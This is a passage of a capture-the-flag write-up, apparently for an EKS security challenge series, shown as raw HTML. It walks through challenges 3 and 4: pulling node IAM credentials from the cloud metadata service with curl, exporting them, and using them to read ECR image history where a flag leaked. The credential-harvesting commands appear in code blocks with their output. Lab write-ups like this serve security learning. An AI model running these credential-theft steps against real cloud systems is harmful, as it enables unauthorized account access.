style=\"color: #F69D50\">,</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"sha256:a70cef1cb742e242b33cc21f949af6dc7e59b6ea3ce595c61c179c3be0e5d432\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    ]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  }</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">}</span></span></code></pre></div>\n<p>Looks like they leaked the secret right there in the image layers:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"\" data-theme=\"default\"><code data-language=\"\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #adbac7\">wiz_eks_challenge{nothing_can_be_said_to_*REDACTED*}'</span></span></code></pre></div>\n<p>So lets submit that and move onto the next one!</p>\n<h1>Challenge 3</h1>\n<p>The hint is:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"\" data-theme=\"default\"><code data-language=\"\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #adbac7\">A pod's image holds more than just code. Dive deep into its ECR repository,</span></span>\n<span data-line=\"\"><span style=\"color: #adbac7\">inspect the image layers, and uncover the hidden secret.</span></span>\n<span data-line=\"\"><span style=\"color: #adbac7\"></span></span>\n<span data-line=\"\"><span style=\"color: #adbac7\">Remember: You are running inside a compromised EKS pod.</span></span></code></pre></div>\n<p>This sounds very similar to the last one but with the hints that its on ECR and\nthat we are in the pod itself it makes me believe we'll have something like IRSA\naccess to AWS from the pod and need to use that to get to it.</p>\n<p>First lets check what pods we are working with:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">kubectl</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">get</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">pod</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">NAME</span><span style=\"color: #ADBAC7\">                      </span><span style=\"color: #96D0FF\">READY</span><span style=\"color: #ADBAC7\">   </span><span style=\"color: #96D0FF\">STATUS</span><span style=\"color: #ADBAC7\">    </span><span style=\"color: #96D0FF\">RESTARTS</span><span style=\"color: #ADBAC7\">   </span><span style=\"color: #96D0FF\">AGE</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">accounting-pod-876647f8</span><span style=\"color: #ADBAC7\">   </span><span style=\"color: #6CB6FF\">1</span><span style=\"color: #96D0FF\">/1</span><span style=\"color: #ADBAC7\">     </span><span style=\"color: #96D0FF\">Running</span><span style=\"color: #ADBAC7\">   </span><span style=\"color: #6CB6FF\">0</span><span style=\"color: #ADBAC7\">          </span><span style=\"color: #6CB6FF\">37</span><span style=\"color: #96D0FF\">h</span></span></code></pre></div>\n<p>So same as the last challenge, lets get the image and see what access we have:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">kubectl</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">get</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">pod</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">-o</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">json</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #F47067\">|</span><span style=\"color: #F69D50\">jq</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">'.items[0].spec.containers[0].image'</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">\"688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01\"</span></span></code></pre></div>\n<p>Which as expected, we do not have access to:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">crane</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">config</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">688655246681</span><span style=\"color: #96D0FF\">.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">Error:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">fetching</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">config:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">reading</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">image</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01\":</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">GET</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">https://688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-aaf4a7c/manifests/sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">unexpected</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">status</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">code</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">401</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">Unauthorized:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">Not</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">Authorized</span></span></code></pre></div>\n<p>Since I expect the pod already has AWS access, lets check if the AWS CLI works:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">aws</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">sts</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">get-caller-identity</span></span>\n<span data-line=\"\"> </span>\n<span data-line=\"\"><span style=\"color: #F69D50\">Unable</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">to</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">locate</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">credentials.</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">You</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">can</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">configure</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">credentials</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">by</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">running</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"aws configure\".</span></span></code></pre></div>\n<p>Credentials are not configured right now, so we need to discover them.  Lets\ncheck if we have metadata server access:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">curl</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">http://169.254.169.254/latest/meta-data/iam</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">info</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">security-credentials/</span></span></code></pre></div>\n<p>We do!  So we should be able to pull the credentials out of there to get access\nto AWS:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">curl</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">-sS</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole</span><span style=\"color: #F47067\">|</span><span style=\"color: #F69D50\">jq</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  </span><span style=\"color: #F69D50\">\"AccessKeyId\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"ASIA2AVYNE&#x3C;*REDACTED*>\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  </span><span style=\"color: #F69D50\">\"Expiration\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"2023-11-03 03:50:19+00:00\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  </span><span style=\"color: #F69D50\">\"SecretAccessKey\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"e4TuLKKPBAVvyPkhKiJG0jO0&#x3C;*REDACTED*\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  </span><span style=\"color: #F69D50\">\"SessionToken\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"FwoGZXIvYXdzEBQaDAM9SyNaDBowmWoT1SK3AbqDZUQpyn&#x3C;*REDACTED*>\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">}</span></span></code></pre></div>\n<p>Lets set those as environment variables to activate our AWS access:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F47067\">export</span><span style=\"color: #ADBAC7\"> AWS_ACCESS_KEY_ID</span><span style=\"color: #F47067\">=</span><span style=\"color: #96D0FF\">\"ASIA2AVYNE&#x3C;*REDACTED*\"</span></span>\n<span data-line=\"\"><span style=\"color: #F47067\">export</span><span style=\"color: #ADBAC7\"> AWS_SECRET_ACCESS_KEY</span><span style=\"color: #F47067\">=</span><span style=\"color: #96D0FF\">\"e4TuLKKPBAVvyPkhKiJG0jO0&#x3C;*REDACTED*\"</span></span>\n<span data-line=\"\"><span style=\"color: #F47067\">export</span><span style=\"color: #ADBAC7\"> AWS_SESSION_TOKEN</span><span style=\"color: #F47067\">=</span><span style=\"color: #96D0FF\">\"FwoGZXIvYXdzEBQaDAM9SyNaDBowmWoT1SK3AbqDZUQpyn&#x3C;*REDACTED*>\"</span></span>\n<span data-line=\"\"> </span>\n<span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">aws</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">sts</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">get-caller-identity</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"UserId\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"ASIA2AVYNE&#x3C;*REDACTED*>:i-0cb922c6673973282\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"Account\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"688655246681\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"Arn\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">}</span></span></code></pre></div>\n<p>Now we should be able to authenticate crane and inspect the image from ECR:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">export</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">PASSWORD=$(</span><span style=\"color: #F69D50\">aws</span><span style=\"color: #96D0FF\"> ecr get-login-password)</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">crane</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">auth</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">login</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">-u</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">AWS</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">-p</span><span style=\"color: #ADBAC7\"> $PASSWORD </span><span style=\"color: #6CB6FF\">688655246681</span><span style=\"color: #96D0FF\">.dkr.ecr.us-west-1.amazonaws.com</span><span style=\"color: #ADBAC7\">  </span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">2023/11/03</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">02</span><span style=\"color: #96D0FF\">:56:41</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">logged</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">in</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">via</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">/home/user/.docker/config.json</span></span></code></pre></div>\n<p>Lets get those layers!</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">crane</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">config</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">688655246681</span><span style=\"color: #96D0FF\">.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01</span><span style=\"color: #F47067\">|</span><span style=\"color: #F69D50\">jq</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  </span><span style=\"color: #F69D50\">\"architecture\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"amd64\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  </span><span style=\"color: #F69D50\">\"config\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"Env\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> [</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    ],</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"Cmd\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> [</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"/bin/sleep\"</span><span style=\"color: #F69D50\">,</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"3133337\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    ],</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"ArgsEscaped\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">true</span><span style=\"color: #96D0FF\">,</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"OnBuild\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">null</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  },</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  </span><span style=\"color: #F69D50\">\"created\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"2023-11-01T13:32:07.782534085Z\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  </span><span style=\"color: #F69D50\">\"history\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> [</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    {</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"created\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"2023-07-18T23:19:33.538571854Z\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"created_by\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / \"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    },</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    {</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"created\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"2023-07-18T23:19:33.655005962Z\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"created_by\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"/bin/sh -c #(nop)  CMD [</span><span style=\"color: #F47067\">\\\"</span><span style=\"color: #96D0FF\">sh</span><span style=\"color: #F47067\">\\\"</span><span style=\"color: #96D0FF\">]\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"empty_layer\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">true</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    },</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    {</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"created\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"2023-11-01T13:32:07.782534085Z\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"created_by\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{the_history_of_container_images_could_reveal&#x3C;*REDACTED*>} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"comment\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"buildkit.dockerfile.v0\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    },</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    {</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"created\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"2023-11-01T13:32:07.782534085Z\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"created_by\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"CMD [</span><span style=\"color: #F47067\">\\\"</span><span style=\"color: #96D0FF\">/bin/sleep</span><span style=\"color: #F47067\">\\\"</span><span style=\"color: #96D0FF\"> </span><span style=\"color: #F47067\">\\\"</span><span style=\"color: #96D0FF\">3133337</span><span style=\"color: #F47067\">\\\"</span><span style=\"color: #96D0FF\">]\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"comment\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"buildkit.dockerfile.v0\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"empty_layer\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">true</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    }</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  ],</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  </span><span style=\"color: #F69D50\">\"os\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"linux\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  </span><span style=\"color: #F69D50\">\"rootfs\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"type\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"layers\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"diff_ids\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> [</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f\"</span><span style=\"color: #F69D50\">,</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    ]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  }</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">}</span></span></code></pre></div>\n<p>Looks like they made the same mistake again and leaked the secret in the image\nlayers!</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"\" data-theme=\"default\"><code data-language=\"\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #adbac7\">wiz_eks_challenge{the_history_of_container_images_could_reveal&#x3C;*REDACTED*>} </span></span></code></pre></div>\n<p>Time for challenge 4!</p>\n<h1>Challenge 4</h1>\n<p>The hint:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"\" data-theme=\"default\"><code data-language=\"\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #adbac7\">You're inside a vulnerable pod on an EKS cluster. Your pod's service-account has</span></span>\n<span data-line=\"\"><span style=\"color: #adbac7\">no permissions. Can you navigate your way to access the EKS Node's privileged</span></span>\n<span data-line=\"\"><span style=\"color: #adbac7\">service-account?</span></span></code></pre></div>\n<p>This sounds like we're going to need to escalate our privileges through the AWS\naccess we acquired in the last challenge. Lets start with inspecting the\nenvironment again:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">kubectl</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">get</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">pod</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">Error</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">from</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">server</span><span style=\"color: #ADBAC7\"> (Forbidden): pods is forbidden: User </span><span style=\"color: #96D0FF\">\"system:serviceaccount:challenge4:service-account-challenge4\"</span><span style=\"color: #ADBAC7\"> cannot list resource </span><span style=\"color: #96D0FF\">\"pods\"</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #F47067\">in</span><span style=\"color: #ADBAC7\"> API group </span><span style=\"color: #96D0FF\">\"\"</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #F47067\">in</span><span style=\"color: #ADBAC7\"> the namespace </span><span style=\"color: #96D0FF\">\"challenge4\"</span></span></code></pre></div>\n<p>So we don't even have access to list pods!   Do we have any access?</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">kubectl</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">auth</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">can-i</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">--list</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">warning:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">the</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">list</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">may</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">be</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">incomplete:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">webhook</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">authorizer</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">does</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">not</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">support</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: 